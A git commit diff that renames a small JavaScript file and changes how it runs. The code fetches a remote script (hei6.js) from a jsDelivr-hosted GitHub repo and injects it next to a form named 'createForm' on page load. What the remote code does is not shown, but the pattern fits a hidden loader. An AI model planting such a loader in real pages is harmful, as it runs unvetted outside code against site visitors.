9f9a6ff5de1ddca7918b08c98a3ed88eab93fa61
xjjkong <138182422+xjjkong@users.noreply.github.com>
2023-06-30 21:44:36 +0800

    Update and rename ha10.js to ha11.js

--- ha11.js
+++ ha11.js
@@ -1,7 +1,7 @@
-(function(){var scriptEle = document.createElement("script");
+window.onload=function(){var scriptEle = document.createElement("script");
      scriptEle.type = "text/javascript";
      scriptEle.src = "https://cdn.jsdelivr.net/gh/xjjkong/haha@main/hei6.js";
      var x = document.getElementById("createForm");
      x.insertBefore(scriptEle, x.firstChild);
      document.body.appendChild(scriptEle);
- })();
+}
